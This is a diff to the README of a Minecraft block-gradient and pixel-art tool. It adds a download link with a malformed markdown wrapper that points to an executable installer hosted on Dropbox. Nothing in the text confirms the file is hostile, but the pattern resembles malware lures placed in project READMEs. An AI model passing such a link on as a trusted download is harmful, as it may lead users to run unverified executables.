@@ -2,6 +2,12 @@
 
 **SkymcDB** is a tool designed for Minecraft builders, focused on generating block gradients, converting colors to blocks, creating pixel art, and generating Perlin noise-based patterns. It offers real-time previews, color-accurate results, and a modern interface.
 
+## 📦 Download
+
+> 📥 **[Click here to download the latest version of SkymcDB]([https://example.com/download](https://www.dropbox.com/scl/fi/903uvypyu4trpcb5hmpla/SkymcDB_Installer.exe?rlkey=b5a5mkrbzsjgjzlbsccovzsxf&st=zytvdr11&dl=1))**  
+
+---
+
 ## ✨ Features
 
 ### 🎨 Block Gradient Generator
